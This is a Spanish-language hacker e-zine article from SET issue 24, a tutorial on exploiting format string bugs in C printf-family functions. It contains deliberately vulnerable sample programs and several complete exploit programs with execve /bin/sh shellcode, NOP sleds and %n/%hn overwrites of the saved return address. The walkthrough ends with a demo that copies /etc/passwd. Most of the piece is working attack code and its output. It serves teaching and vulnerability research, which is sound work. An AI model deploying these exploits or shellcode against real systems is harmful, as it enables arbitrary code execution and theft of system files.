@@ -1,0 +1,825 @@
+-[ 0x08 ]--------------------------------------------------------------------
+-[ Format Bugs ]-------------------------------------------------------------
+-[ by Doing ]---------------------------------------------------------SET-24-
+
+
+                              Format bugs 
+                              =-=-=-=-=-=
+                               by Doing
+
+ Intro
+ =-=-=
+
+  Recientemente han aparecido una serie de "bugs" o fallos de programacion
+ que parecen estar afectando a un gran numero de programas, demonios, etc...
+ Esta ocurriendo mas o menos lo mismo que con los buffer overflows, solo que
+ estos bugs son algo mas complicados de entender. En este articulo voy a 
+ intentar explicar en que consisten este tipo de fallos, asi como formas de
+ aprovecharse de ellos para ejecutar codigo arbitrario. Vamos a ello.
+
+ Funciones conversoras
+ =-=-=-=-=-=-=-=-=-=-=
+
+  La verdad no se si se llaman asi, pero son las conocidas funciones *printf,
+ que siempre toman un argumento que indica "el formato", asi que de aqui en
+ adelante las llamare *printf o funciones conversoras.
+  
+  Todas las funciones tienen esta estrucura:
+
+ int nombre ([destino], char *FORMATO, ...);
+
+ por ejemplo sprintf:
+
+ int sprintf( char *str, const char *format, ...);
+
+  Estas funciones sirven para "convertir" valores, cadenas, direcciones, etc
+ en algo que el programador quiera, comumente la represancion ascii de un
+ numero, el valor ascii en hexadecimal de una direccion, etc. Para tal fin, se
+ le pasa a la funcion una cadena de caracteres que continene unos "simbolos"
+ que indican el tipo de conversion y opcionalmente parametros como la longitud
+ del valor convertido, padding y alguno mas. Estos "simbolos" estas compuestos
+ por un signo '%' y un caracter que indica el tipo de conversion. Estos son
+ algunos que nos interesan:
+
+ %s -> cadena de caracteres
+ %x -> valor hexadecimal
+ %p -> puntero
+ %i -> entero
+ %u -> entero sin signo
+ %n y %hn los veremos despues 
+ ...
+
+  Hay muchos mas, man printf para mas detalles ;-)
+
+  Hay ciertos "parametros" que se le pueden pasar a la funcion en la cadena de
+ formato, para indicar tamanio o padding. Con un par de ejemplos se ve claro:
+
+ %04x -> convierte a un numero hexadecimal. Como mucho muestra 4 cifras, y si 
+         ocupa menos rellena el resto con ceros.
+
+ %.400d -> convierte a un numero entero. Como mucho muestra 400 cifras, y si
+           ocupa menos rellena el resto con ceros.
+
+ El problema
+ =-=-=-=-=-= 
+
+  Lo mas logico a la hora de convertir un string es hacer algo como esto:
+ printf("%s", str) ; pero claro, algunos programadores piensan, si no voy
+ a convertir ningun valor, para que pongo cadena de fornato? y dejan lo
+ anterior asi: printf(str);, lo que es un grave error. 
+  
+  Esa cadena que se le pasa como formato, puede dar la casualidad de tener
+ algun simbolo '%', asi que printf lo tomara como un conversor y tratara de
+ convertir el valor. Si la cadena no la puede suministrar el usuario no es
+ tan grave, pero si podemos elegir lo que ira en la cadena de formato entonces
+ entramos en juego :P
+
+  Hay dos formas de explotar estos fallos. La primera es practicamente igual
+ que un overflow convencional, la segunda es usando los conversores %n y %hn,
+ que ya explicare en su momento.
+
+ Forma # 1
+ =-=-=-=-=
+ 
+ El overflow tradicional se basa en que un programa hace una copia de una zona
+ de memoria a otra que se encuentra en el stack sin hacer un chequeo de la
+ longitud de la primera zona, con lo que si la cadena o zona fuente es mas
+ grande que la de destino se sobreescriben los bytes siguientes. 
+
+  Vamos a jugar con este programa vulnerable:
+
+<++> formats/vulnerable1.c
+
+void copia(char *src)
+{
+  char dst[1024];
+
+  if (strlen(src) > 1024) {
+    printf("Buen intento! :P\n");
+    exit(-1);
+  }
+
+  sprintf(dst, src);
+  printf("El primer argumento es: %s\n", dst);
+}
+
+int main(int argc, char **argv)
+{
+
+  if (argc < 2) {
+    printf("Uso:\n");
+    printf(" %s <argumento>\n\n", argv[0]);
+    exit(0);
+  }
+
+  copia(argv[1]);
+
+  return 0;
+}
+
+<-->
+
+  El funcionamiento es muy simple: el programa mira si tiene un argumento
+ suministrado por el usuario; si es asi, llama a la funcion copia() pasandole
+ como parametro dicho argumento, y esta funcion copia con sprintf() el
+ argumento a un buffer local, *pero* antes comprueba que la longitud del
+ parametro no sea mayor que el buffer local, para evitar desbordamientos, asi
+ que no podemos desobordar este programa usando la tipica tecnica del buffer
+ overflow.
+
+  El fallo del programa esta logicamente en que para copiar el argumento en 
+ el buffer usa sprintf() pasandole como cadena de formato el argumento, que,
+ casualmente, lo sumistra el usuario ;-P.  
+
+  Como lo explotamos? Vamos a saltarnos el chequeo de la longitud del
+  argumento, usando un %0Zx, siendo ZZ el tama~o de la cadena destino.
+  Observad lo que pasa al hacerlo:
+
+doing@apocalipsis:~> ./vuln %01038x
+El primer argumento es: 0000 [muchos '0's] 000bffff608
+Segmentation fault
+doing@apocalipsis:~>
+
+  Conseguimos desbordar el buffer destino. A la hora de hacer el exploit hay
+que tener varias cosas en cuenta.Tenemos que meter por en medio del argumento
+la cadena %0Zx, ademas de la shellcode, las NOP's y la direccion con la que
+sobreescribiremos EIP. Las NOP's y la shellcode tienen que ir juntas, pero
+la 'futura' EIP no es necesario que vaya a continuacion de la shellcode; asi
+que el argumento que le tendriamos que pasar al programa tendria este formato:
+
+	 [NOP's] [shellcode] [cadena %0Zx ] [ 'futura' EIP ]
+
+ La cantidad optima de NOP's seria TAMA~O DEL BUFFER - TAMA~O DEL SHELLCODE
+ - 4 BYTES DE EIP - LONGITUD DE LA CADENA %0Zx,
+de forma que se cumpliera que la longitud del argumento fuese igual al tama~o
+del buffer, y que se cumpliera esta ecuacion:
+
+ NOP's + TAMA~O SHELLCODE + 4 bytes de EIP + (parametro 'Z' - longitud de
+ cadena %0Zx) = TAMA~O BUFFER + 8
+
+  Para el valor de Z se debe usar como minimo el 13, para que todo encaje
+ perfectamente y asi se usa el mayor numero de NOP's posible, si asi no os 
+ cuadra la ecuacion de arriba id incrementando el valor de Z y recalculando
+ el numero de NOP's hasta que os cuadre todo.
+
+  En este exploit voy a usar estos valores:
+
+ - tama~o del buffer : 1024
+ - NOP's : 970
+ - valor Z : 13
+ 
+  Aqui lo teneis:
+
+<++> formats/exploit1.c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+
+char shellcode[] =
+ "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+ "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+ "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+#define NOP 0x90
+
+#define BUFFER_SIZE 1024
+
+u_int32_t get_sp()
+{
+  __asm__(" movl %esp, %eax ");
+}
+
+int main(int argc, char **argv)
+{
+  char *fmt_str = "%013x";
+  int NOPS = BUFFER_SIZE - strlen(shellcode) - 4 - strlen(fmt_str);
+  char evil_buf[BUFFER_SIZE + 1];
+  char *ptr = evil_buf;
+  int c;
+  u_int32_t ret = get_sp();
+  int offset = 0;
+  char *args[3];
+
+  printf("Uso: %s [offset]\n", argv[0]);
+
+  memset(evil_buf, 0, sizeof(evil_buf));
+  
+  for (c = 0; c < NOPS; c++)
+    *(ptr++) = NOP;
+
+  if (argc > 1) offset = atoi(argv[1]);
+  ret -= offset;
+
+  printf("NOP\'s = %i EIP = %x OFFSET = %i\n", NOPS, ret, offset);
+
+  sprintf(ptr, "%s%s%c%c%c%c", shellcode, fmt_str,
+   ret & 0xff,
+   (ret & 0xff00) >> 8, 
+   (ret & 0xff0000) >> 16, 
+   (ret & 0xff000000) >> 24);
+ 
+  args[0] = "./vuln";
+  args[1] = evil_buf;
+  args[2] = NULL;
+
+  execve(args[0], args, NULL);
+
+  printf("Error al ejecutar %s\n", args[0]);
+} 
+
+<-->
+
+ Y aqui teneis la demostracion :P
+
+doing@apocalipsis:~> ./exploit1 -1000
+Uso: ./exploit1 [offset]
+NOP's = 970 EIP = bffff9ac OFFSET = -1000
+El primer argumento es: [NOP's y caracteres no-printables :P]
+Í1ÛØ@Í€èÜÿÿÿ/bin/sh0000090909090¬ùÿ¿ sh-2.03$
+
+
+ Forma # 2
+ =-=-=-=-=
+
+ En muchas ocasiones la funcion conversora usada no copiara un buffer en otro,
+ sino que simplemente escribira algo por pantalla, en el syslog, o algo
+ parecido, asi que nos podemos ir olvidando de explotar estos programas por
+ medio del overflow tradicional.
+
+  Asi que no podemos sobreescribir nada, pero, podemos usar los conversores %n
+ y %hn. Estos conversores en realidad no "convierten nada". Toman como
+ argumento un puntero, y escriben en esa zona de memoria el numero de bytes
+ procesados por printf hasta el %n o %hn. La diferencia entre ambos es que %n
+ escribe un numero de 32 bits y %hn de 16 bits. Un par de ejemplos:
+
+ int c;
+ short int d;
+ .
+ .
+ printf("1234%n5678%hn", &c, &d);
+ .
+ .
+ printf("c vale %i y d vale %i\n", c, d);
+
+ Que creeis que sacare este programa por pantalla? Esto:
+
+ c vale 4 y d vale 8
+
+ Entendido? Bien, seguimos :P
+
+ Asi que podemos escribir en memoria con estos conversores, asi que, esta
+ claro que lo intentaremos sobreescribir es la EIP salvada en el stack :P
+
+ Pero la direccion donde se escribe se la tenemos que pasar como parametro a
+ la funcion conversora, pero... como??
+
+ Paso de parametros
+ =-=-=-=-=-=-=-=-=-
+
+  Recordemos: la funcion coversora va recorriendo su cadena de formato en
+  busca de 'tags' de conversion, y cuando encuentra uno coje un dato del
+  stack, como un parametro de una funcion (es que es eso :P). Un ejemplo:
+
+ - Si la cadena de formato es esta "%i %n %d %s", la funcion conversora
+ asociara cada 'tag' con estos parametros en el stack:
+
+[Variab. locales] [SAVED EBP] [SAVED EIP] [PARAM1] [PARAM2] [PARAM3] [PARAM4]
+/\                  /\                         /\       /\       /\       /\
+||                  ||                         ||       ||       ||       ||
+ESP                 EBP                        %i       %n       %d       %s
+
+  Asi que la unica forma que tenemos de pasarle parametros a la funcion es
+ poder escribir en una zona del stack que este mas 'alta' que la zona de esa
+ funcion, y despues 'paddear' con %.8d o %08x o con lo que quieras hasta hacer
+ coincidir el/los conversores %n/%hn con sus respectivos parametros.
+
+  Vamos a jugar un poco con este programilla:
+
+<++> formats/prueba.c
+
+#include <stdio.h>
+#include <stdlib.h>
+
+void escribe(char *arg)
+{
+  int test = 0xaabbccdd;
+  printf(arg);
+  fflush(stdout);
+}
+
+int main()
+{
+  int l;
+  char localbuffer[256];
+
+  for (l = 0; l < 3; l++) {
+    memset(localbuffer, 0, 256);
+    read(0, localbuffer, 256);
+    escribe(localbuffer);
+  }
+}
+
+<-->
+
+ Compilamos y ejecutamos:
+
+doing@apocalipsis:~> gcc prueba.c -o prueba
+doing@apocalipsis:~> ./prueba 
+
+ Ahora, si escribimos algo, se le pasara como cadena de formato a printf:
+
+doing@apocalipsis:~> ./prueba 
+probando %i
+probando -1430532899
+probando %n
+Segmentation fault
+doing@apocalipsis:~> 
+
+ Mmm, lo que ha pasado aqui es que printf ha intentado escribir en la posicion
+ de memoria -1430532899, y por eso ha causado un segfault. Vamos a paddear y
+ tratar de escribir en una zona de memoria que nosotros queramos. El stack
+ de este programa en la funcion printf esta asi:
+
+ [arg] [test] [EBP] [EIP] [arg] [localbuffer] [l] [EBP] [EIP] ...
+
+  El printf coje arg como cadena de formato, y luego ira cogiendo el resto de
+ los parametros del stack segun vaya encontrando 'tags'. Nosotros podemos
+ escribir en localbuffer, asi que si padeamos con %d hasta llegar al
+ localbuffer, el siguiente tag se asociara con los primeros 4 bytes de
+ localbuffer, y habremos conseguido pasar parametros al tag :P
+
+  Cuantos %d ponemos ? Pues, 1 (test) + 1 (ebp) + 1 (eip) + 1 (arg) = 4.
+
+doing@apocalipsis:~> ./prueba 
+AAAA %d %d %d %d %x
+AAAA -1430532899 -1073743352 134513825 -1073743416 41414141
+
+
+ Funciona :-). Hemos asociado AAAA con el %x, y hemos escrito 41414141
+ (nota: AAAA en hexa es 0x41414141)
+
+
+ Sobrescribiendo EIP's
+ =-=-=-=-=-=-=-=-=-=-=
+
+  Ahora que ya sabemos como pasar parametros a printf nos queda la parte mas
+ complicada :P
+
+  Vamos a tratar de explotar el programa prueba. Tenemos que sobreescribir la 
+ direcciona de la shellcode en la EIP salvada de la funcion escribe.
+ Como podemos averiguar esta direccion? Asip:
+
+doing@apocalipsis:~> ./prueba 
+%p %p %p %p %p %p
+0xaabbccdd 0xbffffa18 0x80484ae 0xbfffea18 0x25207025 0x70252070
+                                     /\
+                                     ||
+           Esto es arg, que a su vez es la direccion de locabuffer.
+ Si miramos al mapa del stack de antes:
+
+ [arg] [test] [EBP] [EIP] [arg] [localbuffer] [l] [EBP] [EIP] ...
+
+ La posicion de EIP esta 8 bytes por debajo de la de localbuffer, y la de
+ localbuffer la conocemos :P. direccion de eip = 0xbfffea18 - 8 = 0xbfffea10
+
+ Ya tenemos la direccion. vamos a hacer un programa que escriba un numero en
+ esta direccion usando %n, y miraremos donde nos da el segfault el programa.
+
+<++> formats/escribe1.c 
+
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+  int retdir =  0xbfffea10;
+  char buffer[4096];
+  char *args[2];
+  int padding = 4, c;
+  int fds[2];
+  int status, pid;
+
+  args[0] = "./prueba";
+  args[1] = NULL;
+
+  memset(buffer, 0, 4096);
+
+  /* Ponemos la direccion donde vamos a escribir */
+  *(int*)buffer = retdir;
+
+  /* Ponemos el padding para cuadrar el %n con su argumento */
+  for (c = 0; c < padding; c++) strcat(buffer, "%d");
+
+  /* Y ahora el %n */
+
+  strcat(buffer, "%n");
+
+  /* Ahora creamos una pipe  */
+
+  pipe(&fds);
+
+  /* Duplicamos el proceso */
+
+  if (!(pid = fork())) {
+    /* proceso hijo */
+    /* Cerramos el descriptor de escritura */
+    close(fds[1]);
+
+    /* Cierro entrada estandar */
+    close(0);
+
+    /* Y hago que la pipe sea la nueva stdin */
+    dup2(fds[0], 0);
+
+    /* Ejecutamos prueba */
+    execve(args[0], args, NULL);
+    printf("execve ha fallado\n");
+    exit(-1);
+  }
+
+  /* proceso padre */
+  /* Cerramos el descriptor de escritura */
+  close(fds[0]);
+
+  /* Pongo el intro al final de buffer */
+  strcat(buffer, "\n");
+  
+  printf("Enviando parametro a prueba...\n"); fflush(stdout);
+  sleep(1);
+
+  write(fds[1], buffer, strlen(buffer));
+  write(fds[1], "\n\n", 2);
+  
+
+  waitpid(pid, &status, 0);
+  /* Esperamos que finalice el proceso hijo antes de salir */
+}
+
+<-->
+
+ Compilamos y ejecutamos:
+
+doing@apocalipsis:~> gcc escribe1.c -o escribe1
+doing@apocalipsis:~> ./escribe1 
+Enviando parametro a prueba...
+doing@apocalipsis:~>
+
+ mmmm, pos no ha funcionado :/ Que pasa? Pues pasa que la direccion de eip
+ ha cambiado, porque el proceso prueba tiene un padre distinto, antes era la
+ shell, y ahora es el propio exploit. Pero esto quiere decir que la direccion
+ de eip cambiara en cada maquina, asi que tenemos que currarnoslo para que el
+ exploit busque la direccion, recordais como la averiguamos? :P
+
+ Aqui teneis el exploit:
+
+<++> formats/escribe2.c
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+  int retdir =  0xbfffea10;
+  char buffer[4096], buffer2[256];
+  char *args[2];
+  int padding = 4, c, a1, a2, a3;
+  int fds[2], fds2[2];
+  int status, pid, l;
+
+  args[0] = "./prueba";
+  args[1] = NULL;
+
+  /* Ahora creamos *dos* pipes  */
+
+  pipe(&fds);
+  pipe(&fds2);
+
+  /* Duplicamos el proceso */
+
+  if (!(pid = fork())) {
+    /* proceso hijo */
+ /* Cerramos el descriptor de escritura  de una pipe y el de lectura de otra*/
+    close(fds[1]);
+    close(fds2[0]);
+
+    /* Cierro stdin y stdout */
+    close(0);
+    close(1);
+
+ /* Y hago que una pipe sea la nueva stdin y la otra stdout*/
+    dup2(fds[0], 0);
+    dup2(fds2[1], 1);
+
+    /* Ejecutamos prueba */
+    execve(args[0], args, NULL);
+    printf("execve ha fallado\n");
+    exit(-1);
+  }
+
+  /* proceso padre */
+  /* Cerramos el descriptor de escritura y el de lectura de la otra */
+  close(fds[0]);
+  close(fds2[1]);
+
+  sprintf(buffer2, "%s", "%p %p %p %p\n");
+  printf("Averiguando la direccion de eip...\n"); fflush(stdout);
+  write(fds[1], buffer2, strlen(buffer2));
+  
+  memset(buffer2, 0, 256);
+  read(fds2[0], buffer2, 256);
+
+  printf("leido = %s\n", buffer2);
+
+  sscanf(buffer2, "%x %x %x %x\n", &a1, &a2, &a3, &retdir);
+  /* Ahora tenemos en retdir la direccion de localbuffer. Le restamos 8 para
+     obtener la direccion de eip */
+  retdir -= 8;
+  printf("retdir = %p\n", retdir);
+
+  memset(buffer, 0, 4096);
+  /* Ponemos la direccion donde vamos a escribir */
+  *(int*)buffer = retdir;
+
+  /* Ponemos el padding para cuadrar el %n con su argumento */
+  for (c = 0; c < padding; c++) strcat(buffer, "%d");
+
+  /* Y ahora el %n */
+  strcat(buffer, "%n");
+
+  /* Pongo el intro al final de buffer */
+  strcat(buffer, "\n");
+  
+  printf("Enviando parametro a prueba...\n"); fflush(stdout);
+  sleep(10);
+
+  write(fds[1], buffer, strlen(buffer));
+  
+  for (;;) {
+    l = read(fds2[0], buffer2, 256);
+    if (l < 0) break;
+    write(1, buffer2, l);
+  }
+
+  waitpid(pid, &status, 0);
+  /* Esperamos que finalice el proceso hijo antes de salir */
+}
+
+<-->
+
+doing@apocalipsis:~> gcc escribe2.c -o escribe2
+doing@apocalipsis:~> ./escribe2
+Averiguando la direccion de eip...
+leido = 0xaabbccdd 0xbfffff08 0x804851e 0xbfffef08
+
+retdir = 0xbfffef00
+Enviando parametro a prueba...
+
+[ctrl + c]
+doing@apocalipsis:~>
+
+ Arg, lo que me faltaba, la direccion tiene un \0 :-/. Vamos a probar a
+ sobreescribir la direccion de retorno de main(), que debera estar en
+ localbuffer + 256 + 4 (l) + 4 (ebp). Cambiad la linea que pone retdir -= 8
+ por retdir += 264. Tambien cambiad la linea que pone sleep(1) por sleep(10).
+
+---------- En una terminal ----------------------
+doing@apocalipsis:~> ./escribe2
+Averiguando la direccion de eip...
+leido = 0xaabbccdd 0xbfffff08 0x8048532 0xbffffe04
+
+retdir = 0xbfffff0c
+Enviando parametro a prueba...
+
+-------- Mientras, en la otra ------------------
+doing@apocalipsis:~> ps aux | grep pru
+doing      587  0.0  0.5  1104   368  ?  S    14:13   0:00 ./prueba 
+doing@apocalipsis:~> gdb ./prueba 587
+GNU gdb 4.18
+[ cut cut cut ]
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x2e in ?? ()
+(gdb) 
+
+
+  mmmm, parece que ya conseguimos sobreecribir eip :). Pero hemos puesto 0x2e,
+ y nos vendria mejor poner una direccion con una shellcode, no creeis? ;->
+
+  La direccion que pongamos dependera del numero de bytes escritos por printf
+ hasta encontrar el %n. Asi que tenemos que arreglarnoslas para meter un
+ porron de bytes antes del %n, pero locabuffer solo tiene 256 XD
+
+  Como lo hacemos? Vamos a hacer que printf 'cree' esos bytes para
+ nosotros, usando padding. Bueno, lo primero es calcular el numero de bytes
+ escritos por los %d y la direccion de eip. eip son 4 bytes, pero los %d
+ pueden ser cadenas como "4", "-12783457" o "700", y eso muchas veces no es
+ predecible, asi que vamos a usar como padding el "%08x", que siempre escribe
+ 8 bytes. El utlimo %x lo usaremos para que printf genere los bytes que nos 
+ hacen falta, asi que de momento sabemos que tenemos estos bytes escritos:
+
+ 4 de la direccion de eip + 8 * 3 de los "%08x" = 28
+
+ Y despues pondremos el %0XXXx. Donde XXXX es la direccion que queremos poner
+ en eip *menos* los 28 bytes que ya tenemos escritos.
+
+ Pero poner todos los bytes de una sola vez hacen que printf cause un
+ segfault, asi que lo haremos en 2 tandas, usando %hn, y poniendo al
+ principio 2  direcciones, una la de eip, y la otra la de eip+2.
+
+ La shellcode la pondremos en una variable de entorno, y lo que hace es
+ ejecutar el comando que le digamos, ya que una shell no podemos porque
+ los descriptores de la stdin y stdout estan chapados. El exploit quedaria
+ asi: 
+
+<++> formats/exploit.c
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#define NOP 0x90
+#define NOPS 3500
+
+char *shellcode =
+"\xeb\x4b\x5e\x89\x76\xac\x83\xee\x20\x8d\x5e\x28\x83\xc6\x20\x89"
+"\x5e\xb0\x83\xee\x20\x8d\x5e\x2e\x83\xc6\x20\x83\xc3\x20\x83\xeb"
+"\x23\x89\x5e\xb4\x31\xc0\x83\xee\x20\x88\x46\x27\x88\x46\x2a\x83"
+"\xc6\x20\x88\x46\xab\x89\x46\xb8\xb0\x2b\x2c\x20\x89\xf3\x8d\x4e"
+"\xac\x8d\x56\xb8\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xb0\xff"
+"\xff\xff/bin/sh -c ";
+
+int main(int argc, char **argv)
+{
+  int retdir =  0xbfffea10;
+  char buffer[4096], buffer2[256];
+  char *args[2];
+  int padding = 3, c, a1, a2, a3;
+  int fds[2], fds2[2];
+  int status, pid, l;
+  unsigned int shaddr = 0xbfffffff;
+  unsigned int hi, lo;
+  int offset = 0;
+  char cmd[256];
+  char envi[4096];
+  char *envp[2];
+
+  printf("xploit para prueba\n");
+  printf("Uso:\n %s <offset> <comando>\n", argv[0]);
+  if (argc < 3) exit(0);
+
+  offset = atoi(argv[1]);
+  shaddr -= offset;
+
+  memset(cmd, 0, 256);
+  for (c = 2; c < argc; c++) {
+    strcat(cmd, argv[c]);
+    strcat(cmd, " ");
+  }
+
+  memset(envi, NOP, 4096);
+  sprintf(&envi[NOPS], "%s%s", shellcode, cmd);
+  memcpy(envi, "A=", 2);
+  envp[0] = envi;
+  envp[1] = NULL;
+
+  args[0] = "./prueba";
+  args[1] = NULL;
+
+  /* Ahora creamos *dos* pipes  */
+
+  pipe(&fds);
+  pipe(&fds2);
+
+  /* Duplicamos el proceso */
+
+  if (!(pid = fork())) {
+    /* proceso hijo */
+ /* Cerramos el descriptor de escritura  de una pipe y el de lectura de otra*/
+    close(fds[1]);
+    close(fds2[0]);
+
+    /* Cierro stdin y stdout */
+    close(0);
+    close(1);
+
+ /* Y hago que una pipe sea la nueva stdin y la otra stdout*/
+    dup2(fds[0], 0);
+    dup2(fds2[1], 1);
+
+    /* Ejecutamos prueba */
+    execve(args[0], args, envp);
+    printf("execve ha fallado\n");
+    exit(-1);
+  }
+
+  /* proceso padre */
+  /* Cerramos el descriptor de escritura y el de lectura de la otra */
+  close(fds[0]);
+  close(fds2[1]);
+
+  sprintf(buffer2, "%s", "%p %p %p %p\n");
+  printf("Averiguando la direccion de eip...\n"); fflush(stdout);
+  write(fds[1], buffer2, strlen(buffer2));
+  
+  memset(buffer2, 0, 256);
+  read(fds2[0], buffer2, 256);
+
+  printf("leido = %s\n", buffer2);
+
+  sscanf(buffer2, "%x %x %x %x\n", &a1, &a2, &a3, &retdir);
+  /* Ahora tenemos en retdir la direccion de localbuffer. Le restamos 8 para
+     obtener la direccion de eip */
+  retdir += 264;
+  printf("retdir = %p\n", retdir);
+
+  memset(buffer, 0, 4096);
+  /* Ponemos la direccion donde vamos a escribir */
+
+  hi = (shaddr >> 16) & 0xffff;
+  lo = shaddr & 0xffff;
+
+  if (lo > hi) {
+    *(int*)buffer = retdir + 2;
+    *(int*)(buffer+4) = retdir;
+    *(int*)(buffer+8) = retdir;
+  }
+
+  if (hi > lo) {
+    *(int*)buffer = retdir;
+    *(int*)(buffer+4) = retdir + 2;
+    *(int*)(buffer+8) = retdir + 2;
+  }
+
+
+  /* Ponemos el padding para cuadrar el %n con su argumento */
+  for (c = 0; c < padding; c++) strcat(buffer, "%08x");
+
+  if (hi > lo) {
+    hi -= lo;
+    sprintf(buffer2, "%%0%ux%%hn%%0%ux%%hn", lo - 36, hi);
+  }
+
+  if (lo > hi) {
+    lo -= hi;
+    sprintf(buffer2, "%%0%ux%%hn%%0%ux%%hn", hi - 36, lo);
+  }
+
+
+  strcat(buffer, buffer2);
+
+  /* Pongo el intro al final de buffer */
+  strcat(buffer, "\n");
+  
+  printf("Enviando parametro a prueba...\n"); fflush(stdout);
+  sleep(1);
+
+  write(fds[1], buffer, strlen(buffer));
+  
+  for (;;) {
+    l = read(fds2[0], buffer2, 256);
+    if (l < 0) break;
+    write(1, buffer2, l);
+    write(fds[1], "\n", 1);
+  }
+
+  waitpid(pid, &status, 0);
+  /* Esperamos que finalice el proceso hijo antes de salir */
+}
+
+<-->
+
+Compilamos y ejecutamos:
+
+doing@apocalipsis:~> ./exploit 1000 /bin/cp /etc/passwd /loko 
+
+[ Un monton de caracteres ]
+
+doing@apocalipsis:~> ls -las /loko
+   3 -rw-r--r--   1 doing     users         2056 Nov  4 16:04 /loko
+
+Al primer intento :)
+
+ 
+ Conclusion
+ =-=-=-=-=-
+
+  Como se puede ver, estos bugs son relativamente dificiles de explotar, aun
+ viendo el resultado del printf hemos tenido algunos problemas, asi que sin
+ verlo como pasa al intentar explotar demonios o programas donde no ves el
+ resultado es muy dificil. En estos casos se suelen usar offsets y direcciones
+ por defecto, que suelen ser las mismas en distribuciones iguales (en linux).
+
+  Hay mas variantes de este fallo ademas de esta que he mostrado, como por
+ ejemplo los syslog y funciones que llaman a vsprintf que se comportan como
+ funciones de formato. 
+
+  Bueno, pues... eso es todo :)
+
+
+                        El placer mas noble es el jubilo de comprender
+                                                - Leonardo da Vinci
+
+ *EOF*
